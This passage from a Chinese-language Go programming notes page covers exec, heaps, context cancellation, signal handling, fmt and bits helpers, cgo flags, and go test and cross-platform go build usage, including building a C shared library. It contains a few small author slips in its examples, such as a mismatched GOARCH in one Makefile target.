class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="21-exec-执行命令"><a href="#21-exec-执行命令" class="headerlink" title="21. exec 执行命令"></a>21. exec 执行命令</h2><h3 id="21-1-打开浏览器"><a href="#21-1-打开浏览器" class="headerlink" title="21.1. 打开浏览器"></a>21.1. 打开浏览器</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">openBrowser</span><span class="params">(url <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	command := <span class="string">&quot;&quot;</span></span><br><span class="line">	args := []<span class="type">string</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">switch</span> runtime.GOOS &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;windows&quot;</span>:</span><br><span class="line">		command = <span class="string">&quot;start&quot;</span></span><br><span class="line">		args = <span class="built_in">append</span>(args, <span class="string">&quot;/c&quot;</span>)</span><br><span class="line">		args = <span class="built_in">append</span>(args, <span class="string">&quot;start&quot;</span>)</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;linux&quot;</span>:</span><br><span class="line">		command = <span class="string">&quot;xdg-open&quot;</span></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">		command = <span class="string">&quot;open&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	args = <span class="built_in">append</span>(args, url)</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;exec&quot;</span>, command, args)</span><br><span class="line">	cmd := exec.Command(command, args...)</span><br><span class="line">	cmd.Start()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="22-heap-堆"><a href="#22-heap-堆" class="headerlink" title="22. heap 堆"></a>22. heap 堆</h2><h3 id="22-1-小根堆"><a href="#22-1-小根堆" class="headerlink" title="22.1. 小根堆"></a>22.1. 小根堆</h3><ul>
<li>基础类型小根堆直接使用<code>sort.IntSlice</code>等可以实现</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> lhp <span class="keyword">struct</span>&#123; sort.IntSlice &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *lhp)</span></span> Push(x <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">	l.IntSlice = <span class="built_in">append</span>(l.IntSlice, x.(<span class="type">int</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *lhp)</span></span> Pop() <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">	n := <span class="built_in">len</span>(l.IntSlice)</span><br><span class="line">	x := l.IntSlice[n<span class="number">-1</span>]</span><br><span class="line">	l.IntSlice = l.IntSlice[:n<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>上面代码大致解释就是，使用hp继承<code>sort.IntSlice</code>的各种基础方法</li>
<li>实现Push和Pop两个接口即可实现最小堆</li>
</ul>
<h3 id="22-2-大根堆"><a href="#22-2-大根堆" class="headerlink" title="22.2. 大根堆"></a>22.2. 大根堆</h3><ul>
<li>照抄小根堆，然后将Less重写一下就好了，j和i互调顺序</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> bhp <span class="keyword">struct</span>&#123; sort.IntSlice &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *bhp)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> l.IntSlice.Less(j, i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *bhp)</span></span> Push(x <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">	l.IntSlice = <span class="built_in">append</span>(l.IntSlice, x.(<span class="type">int</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *bhp)</span></span> Pop() <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">	n := <span class="built_in">len</span>(l.IntSlice)</span><br><span class="line">	x := l.IntSlice[n<span class="number">-1</span>]</span><br><span class="line">	l.IntSlice = l.IntSlice[:n<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="23-context"><a href="#23-context" class="headerlink" title="23. context"></a>23. context</h2><h3 id="23-1-关闭子协程的方式"><a href="#23-1-关闭子协程的方式" class="headerlink" title="23.1. 关闭子协程的方式"></a>23.1. 关闭子协程的方式</h3><h4 id="1-手动关闭协程"><a href="#1-手动关闭协程" class="headerlink" title="1) 手动关闭协程"></a>1) 手动关闭协程</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fatherCtx := context.Background()</span><br><span class="line">	childCtx, cancelChild := context.WithCancel(fatherCtx)</span><br><span class="line">	<span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">	wg.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			<span class="keyword">select</span> &#123;</span><br><span class="line">			<span class="keyword">case</span> &lt;-childCtx.Done():</span><br><span class="line">				fmt.Println(<span class="string">&quot;exit because:&quot;</span>, context.Cause(childCtx))</span><br><span class="line">				wg.Done()</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			<span class="keyword">case</span> &lt;-time.After(<span class="number">1</span> * time.Millisecond):</span><br><span class="line">				fmt.Println(<span class="string">&quot;begin do something&quot;</span>)</span><br><span class="line">				<span class="comment">// 模拟函数执行了5s</span></span><br><span class="line">				time.Sleep(<span class="number">5</span> * time.Second)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">	cancelChild()</span><br><span class="line">	fmt.Println(<span class="string">&quot;notify child quit done&quot;</span>)</span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-定点关闭协程"><a href="#2-定点关闭协程" class="headerlink" title="2) 定点关闭协程"></a>2) 定点关闭协程</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fatherCtx := context.Background()</span><br><span class="line">	childCtx, cancelChild := context.WithDeadline(fatherCtx, time.Now().Add(<span class="number">3</span>*time.Second))</span><br><span class="line">	<span class="keyword">defer</span> cancelChild()</span><br><span class="line">	<span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">	wg.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			<span class="keyword">select</span> &#123;</span><br><span class="line">			<span class="keyword">case</span> &lt;-childCtx.Done():</span><br><span class="line">				fmt.Println(<span class="string">&quot;exit because:&quot;</span>, context.Cause(childCtx))</span><br><span class="line">				wg.Done()</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			<span class="keyword">case</span> &lt;-time.After(<span class="number">1</span> * time.Second):</span><br><span class="line">				fmt.Println(<span class="string">&quot;reach 1 s&quot;</span>)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	fmt.Println(<span class="string">&quot;begin wait&quot;</span>)</span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-定时关闭协程"><a href="#3-定时关闭协程" class="headerlink" title="3) 定时关闭协程"></a>3) 定时关闭协程</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fatherCtx := context.Background()</span><br><span class="line">	childCtx, cancelChild := context.WithTimeout(fatherCtx, <span class="number">3</span>*time.Second)</span><br><span class="line">	<span class="keyword">defer</span> cancelChild()</span><br><span class="line">	<span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">	wg.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			<span class="keyword">select</span> &#123;</span><br><span class="line">			<span class="keyword">case</span> &lt;-childCtx.Done():</span><br><span class="line">				fmt.Println(<span class="string">&quot;exit because:&quot;</span>, context.Cause(childCtx))</span><br><span class="line">				wg.Done()</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			<span class="keyword">case</span> &lt;-time.After(<span class="number">1</span> * time.Second):</span><br><span class="line">				fmt.Println(<span class="string">&quot;reach 1 s&quot;</span>)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	fmt.Println(<span class="string">&quot;begin wait&quot;</span>)</span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-带原因的取消"><a href="#4-带原因的取消" class="headerlink" title="4) 带原因的取消"></a>4) 带原因的取消</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fatherCtx := context.Background()</span><br><span class="line">	childCtx, cancelChild := context.WithCancelCause(fatherCtx)</span><br><span class="line">	<span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">	wg.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			<span class="keyword">select</span> &#123;</span><br><span class="line">			<span class="keyword">case</span> &lt;-childCtx.Done():</span><br><span class="line">				fmt.Println(<span class="string">&quot;exit because:&quot;</span>, context.Cause(childCtx))</span><br><span class="line">				wg.Done()</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			<span class="keyword">case</span> &lt;-time.After(<span class="number">1</span> * time.Second):</span><br><span class="line">				fmt.Println(<span class="string">&quot;reach 1 s&quot;</span>)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	cancelChild(fmt.Errorf(<span class="string">&quot;father notify&quot;</span>))</span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="23-2-携带上下文"><a href="#23-2-携带上下文" class="headerlink" title="23.2. 携带上下文"></a>23.2. 携带上下文</h3><ul>
<li>当前找不到会找父级的context</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fatherCtx := context.Background()</span><br><span class="line">	childCtx := context.WithValue(fatherCtx, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;123&quot;</span>)</span><br><span class="line">	child1Ctx, cancel := context.WithTimeout(childCtx, <span class="number">3</span>*time.Second)</span><br><span class="line">	<span class="keyword">defer</span> cancel()</span><br><span class="line">	<span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">	wg.Add(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> &#123;</span><br><span class="line">			<span class="keyword">select</span> &#123;</span><br><span class="line">			<span class="keyword">case</span> &lt;-child1Ctx.Done():</span><br><span class="line">				fmt.Println(<span class="string">&quot;exit because:&quot;</span>, context.Cause(child1Ctx))</span><br><span class="line">				wg.Done()</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			<span class="keyword">case</span> &lt;-time.After(<span class="number">1</span> * time.Second):</span><br><span class="line">				fmt.Println(<span class="string">&quot;reach 1 s, get test: &quot;</span>, child1Ctx.Value(<span class="string">&quot;test&quot;</span>))</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;()</span><br><span class="line">	fmt.Println(<span class="string">&quot;begin wait&quot;</span>)</span><br><span class="line">	wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="24-os-signal-信号处理库"><a href="#24-os-signal-信号处理库" class="headerlink" title="24. os/signal 信号处理库"></a>24. <code>os/signal</code> 信号处理库</h2><h3 id="24-1-捕获信号"><a href="#24-1-捕获信号" class="headerlink" title="24.1. 捕获信号"></a>24.1. 捕获信号</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	c := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">10</span>)</span><br><span class="line">	signal.Notify(c, syscall.SIGTERM, syscall.SIGINT, syscall.SIGQUIT)</span><br><span class="line">	<span class="keyword">for</span> s := <span class="keyword">range</span> c &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;recieve signal&quot;</span>, s)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>常见的操作对应的信号</li>
</ul>
<table>
<thead>
<tr>
<th>操作</th>
<th>信号值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>ctrl+c</code></td>
<td>syscall.SIGINT</td>
<td>中断</td>
</tr>
<tr>
<td><code>ctrl+z</code></td>
<td>syscall.SIGTSTP</td>
<td>停止</td>
</tr>
<tr>
<td><code>fg</code>或<code>bg</code></td>
<td>syscall.SIGCONT</td>
<td>继续</td>
</tr>
</tbody></table>
<h2 id="25-fmt-格式化输出库"><a href="#25-fmt-格式化输出库" class="headerlink" title="25. fmt 格式化输出库"></a>25. fmt 格式化输出库</h2><h3 id="25-1-Sprintf-格式化字符串"><a href="#25-1-Sprintf-格式化字符串" class="headerlink" title="25.1. Sprintf 格式化字符串"></a>25.1. Sprintf 格式化字符串</h3><h4 id="1-自定义顺序格式化参数"><a href="#1-自定义顺序格式化参数" class="headerlink" title="1) 自定义顺序格式化参数"></a>1) 自定义顺序格式化参数</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(fmt.Sprintf(<span class="string">&quot;%[2]d %[1]d %[1]d %[2]d&quot;</span>, <span class="number">10</span>, <span class="number">20</span>))	<span class="comment">// 20 10 10 20</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="26-math-bits-二进制相关"><a href="#26-math-bits-二进制相关" class="headerlink" title="26. math&#x2F;bits 二进制相关"></a>26. math&#x2F;bits 二进制相关</h2><h3 id="26-1-统计二进制中1的个数"><a href="#26-1-统计二进制中1的个数" class="headerlink" title="26.1. 统计二进制中1的个数"></a>26.1. 统计二进制中1的个数</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(bits.OnesCount(<span class="number">1</span>))</span><br><span class="line">	fmt.Println(bits.OnesCount(<span class="number">2</span>))</span><br><span class="line">	fmt.Println(bits.OnesCount(<span class="number">3</span>))</span><br><span class="line">	fmt.Println(bits.OnesCount(<span class="number">4</span>))</span><br><span class="line">	fmt.Println(bits.OnesCount(<span class="number">5</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="五、cgo"><a href="#五、cgo" class="headerlink" title="五、cgo"></a>五、cgo</h1><h2 id="1-多平台编译"><a href="#1-多平台编译" class="headerlink" title="1. 多平台编译"></a>1. 多平台编译</h2><h3 id="1-1-平台不同的flag"><a href="#1-1-平台不同的flag" class="headerlink" title="1.1. 平台不同的flag"></a>1.1. 平台不同的flag</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #cgo CXXFLAGS: -D CGO -D FORCE_POSIX -I $&#123;SRCDIR&#125;/../../Core -std=c++17</span></span><br><span class="line"><span class="comment">// #cgo linux,amd64 LDFLAGS: -L./lib-linux-amd64 -lmmkv -lcore -lz -lpthread</span></span><br><span class="line"><span class="comment">// #cgo windows,amd64 LDFLAGS: -L./lib-windows-amd64 -lmmkv -lcore -lz -lpthread</span></span><br></pre></td></tr></table></figure>

<h1 id="六、go命令相关"><a href="#六、go命令相关" class="headerlink" title="六、go命令相关"></a>六、go命令相关</h1><h2 id="1-go-test-执行单测用例"><a href="#1-go-test-执行单测用例" class="headerlink" title="1. go test 执行单测用例"></a>1. go test 执行单测用例</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 指定目录 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行当前目录下所有单测文件</span></span><br><span class="line">go test</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行当前目录下及子目录的所有单测文件</span></span><br><span class="line">go test ./...</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行package的某个子目录单测文件</span></span><br><span class="line">go test [package]/[dir]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 指定函数 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行特定函数</span></span><br><span class="line">go test -run ^testFunc$</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行多个特定函数</span></span><br><span class="line">go test -run ^(testFunc|testFunc1)$</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 设定超时时间 ##########</span></span></span><br><span class="line">go test -timeout 30s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">######### 打印详细信息 ##########</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认成功不会打印fmt.Println等，加上-v就会打印</span></span><br><span class="line">go test -v</span><br></pre></td></tr></table></figure>

<h2 id="2-go-build-编译二进制"><a href="#2-go-build-编译二进制" class="headerlink" title="2. go build 编译二进制"></a>2. go build 编译二进制</h2><ul>
<li>go build不区分平台，可以在任意系统上编译其他大多数系统的版本</li>
</ul>
<h3 id="2-1-windows-32bit和64bit"><a href="#2-1-windows-32bit和64bit" class="headerlink" title="2.1. windows 32bit和64bit"></a>2.1. windows 32bit和64bit</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">32位编译</span></span><br><span class="line">go env -w GOOS=windows</span><br><span class="line">go env -w GOARCH=386</span><br><span class="line">go build</span><br><span class="line">go env -u GOARCH</span><br><span class="line">go env -u GOOS</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">64位编译</span></span><br><span class="line">go env -w GOOS=windows</span><br><span class="line">go env -w GOARCH=amd64</span><br><span class="line">go build</span><br><span class="line">go env -u GOARCH</span><br><span class="line">go env -u GOOS</span><br></pre></td></tr></table></figure>

<h3 id="2-2-全平台编译makefile示例"><a href="#2-2-全平台编译makefile示例" class="headerlink" title="2.2. 全平台编译makefile示例"></a>2.2. 全平台编译makefile示例</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">TARGET_NAME		= testaaa</span><br><span class="line">BUILD_CMD		= go build</span><br><span class="line">OUTPUT 			= <span class="variable">$(TARGET_NAME)</span>_x86.exe <span class="variable">$(TARGET_NAME)</span>_x64.exe <span class="variable">$(TARGET_NAME)</span>_linux_amd64 <span class="variable">$(TARGET_NAME)</span>_linux_arm64 <span class="variable">$(TARGET_NAME)</span>_mac_amd64 <span class="variable">$(TARGET_NAME)</span>_mac_arm64</span><br><span class="line"></span><br><span class="line"><span class="section">all: <span class="variable">$(OUTPUT)</span></span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f <span class="variable">$(OUTPUT)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET_NAME)</span>_x86.exe: *.go</span><br><span class="line">	go env -w GOOS=windows</span><br><span class="line">	go env -w GOARCH=386</span><br><span class="line">	<span class="variable">$(BUILD_CMD)</span> -o <span class="variable">$@</span></span><br><span class="line">	go env -u GOOS</span><br><span class="line">	go env -u GOARCH</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET_NAME)</span>_x64.exe: *.go</span><br><span class="line">	go env -w GOOS=windows</span><br><span class="line">	go env -w GOARCH=amd64</span><br><span class="line">	<span class="variable">$(BUILD_CMD)</span> -o <span class="variable">$@</span></span><br><span class="line">	go env -u GOOS</span><br><span class="line">	go env -u GOARCH</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET_NAME)</span>_linux_amd64: *.go</span><br><span class="line">	go env -w GOOS=linux</span><br><span class="line">	go env -w GOARCH=amd64</span><br><span class="line">	<span class="variable">$(BUILD_CMD)</span> -o <span class="variable">$@</span></span><br><span class="line">	go env -u GOOS</span><br><span class="line">	go env -u GOARCH</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET_NAME)</span>_linux_arm64: *.go</span><br><span class="line">	go env -w GOOS=linux</span><br><span class="line">	go env -w GOARCH=arm64</span><br><span class="line">	<span class="variable">$(BUILD_CMD)</span> -o <span class="variable">$@</span></span><br><span class="line">	go env -u GOOS</span><br><span class="line">	go env -u GOARCH</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET_NAME)</span>_mac_amd64: *.go</span><br><span class="line">	go env -w GOOS=darwin</span><br><span class="line">	go env -w GOARCH=arm64</span><br><span class="line">	<span class="variable">$(BUILD_CMD)</span> -o <span class="variable">$@</span></span><br><span class="line">	go env -u GOOS</span><br><span class="line">	go env -u GOARCH</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET_NAME)</span>_mac_arm64: *.go</span><br><span class="line">	go env -w GOOS=darwin</span><br><span class="line">	go env -w GOARCH=arm64</span><br><span class="line">	<span class="variable">$(BUILD_CMD)</span> -o <span class="variable">$@</span></span><br><span class="line">	go env -u GOOS</span><br><span class="line">	go env -u GOARCH</span><br></pre></td></tr></table></figure>

<h3 id="2-3-编译给c调用的动态库"><a href="#2-3-编译给c调用的动态库" class="headerlink" title="2.3. 编译给c调用的动态库"></a>2.3. 编译给c调用的动态库</h3><p><strong>代码上</strong></p>
<ul>
<li>必须有<code>package main</code>和main函数，但是可以什么都不做</li>
<li>必须包含<code>import &quot;C&quot;</code></li>
<li>要导出的函数必须加上<code>//export funcName</code>，export前没有空格</li>
<li>导出函数本身无所谓首字母大小写</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rectangle define class</span></span><br><span class="line"><span class="keyword">type</span> Rectangle <span class="keyword">struct</span> &#123;</span><br><span class="line">    x <span class="type">int</span></span><br><span class="line">    y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Area define method</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Rectangle)</span></span> Area() <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> r.x * r.y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//export test</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">    rec := Rectangle&#123;</span><br><span class="line">        x: <span class="number">14</span>,</span><br><span class="line">        y: <span class="number">34</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(rec.Area())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>编译</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">要先安装标准库，会生成目录到 /usr/lib/go/pkg/linux_[<span class="built_in">arch</span>]_dynlink/</span></span><br><span class="line">go install -buildmode=shared -linkshared std</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编译C动态库</span></span><br><span class="line">go build -buildmode=c-shared -linkshared -o libtest.so</span><br></pre></td></tr></table></figure>

<p><strong>结果</strong></p>
<ul>
<li>会在当前目录生成一个静态库文件（<code>libtest.so</code>）一个头文件（<code>libtest.h</code>）</li>
<li>strip后查看<code>libtest.so</code>，函数已经导出，依赖上述生成的目录下的<code>libstd.so</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; strip libtest.so</span><br><span class="line">=&gt; readelf -Ws libtest.so</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.dynsym&#x27; contains 33 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.17 (2)</span><br><span class="line">     3: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTable</span><br><span class="line">     4: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable</span><br><span class="line">     5: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.17 (2)</span><br><span class="line">     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND runtime.morestack_noctxt</span><br><span class="line">     7: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND type.int</span><br><span class="line">     8: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND type.*os.File</span><br><span class="line">     9: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND os.Stdout</span><br><span class="line">    10: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND type.io.Writer</span><br><span class="line">    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND runtime.addmoduledata</span><br><span class="line">    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND os.(*File).Write</span><br><span class="line">    13: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND go.link.abihash.libstd.so</span><br><span class="line">    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND runtime.unreachableMethod</span><br><span class="line">    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND runtime.convT64</span><br><span class="line">    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _rt0_arm64_linux_lib</span><br><span class="line">    17: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND runtime.lastmoduledatap</span><br><span class="line">    18: 0000000000000000     0 TLS     GLOBAL DEFAULT  UND runtime.tlsg</span><br><span class="line">    19: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fmt.Fprintln</span><br><span class="line">    20: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND __stack_chk_guard@GLIBC_2.17 (3)</span><br><span class="line">    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _cgo_wait_runtime_init_done</span><br><span class="line">    22: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND crosscall2</span><br><span class="line">    23: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _cgo_release_context</span><br><span class="line">    24: 000000000001f950     8 OBJECT  GLOBAL DEFAULT   19 _rt0_arm64_linux_lib.ptr</span><br><span class="line">    25: 0000000000020238     0 NOTYPE  GLOBAL DEFAULT   18 _edata</span><br><span class="line">    26: 0000000000020239     0 NOTYPE  GLOBAL DEFAULT   18 _end</span><br><span class="line">    27: 0000000000001270    64 FUNC    GLOBAL DEFAULT   13 _cgoexp_f70364e750d1_test</span><br><span class="line">    28: 00000000000012b0   144 FUNC    GLOBAL DEFAULT   13 main.test</span><br><span class="line">    29: 0000000000001350   128 FUNC    GLOBAL DEFAULT   13 test</span><br><span class="line">    30: 0000000000020238     0 NOTYPE  GLOBAL DEFAULT   18 __bss_start</span><br><span class="line">    31: 000000000001f988    32 OBJECT  GLOBAL DEFAULT   20 go.itab.*os.File,io.Writer</span><br><span class="line">    32: 000000000001f970    24 OBJECT  GLOBAL DEFAULT   20 runtime.textsectionmap</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以看到依赖了go自己的标准库和libc的库</span></span><br><span class="line">=&gt; readelf -d libtest.so</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0xfce8 contains 32 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x0000000000000003 (PLTGOT)             0x1ff88</span><br><span class="line"> 0x0000000000000002 (PLTRELSZ)           264 (bytes)</span><br><span class="line"> 0x0000000000000017 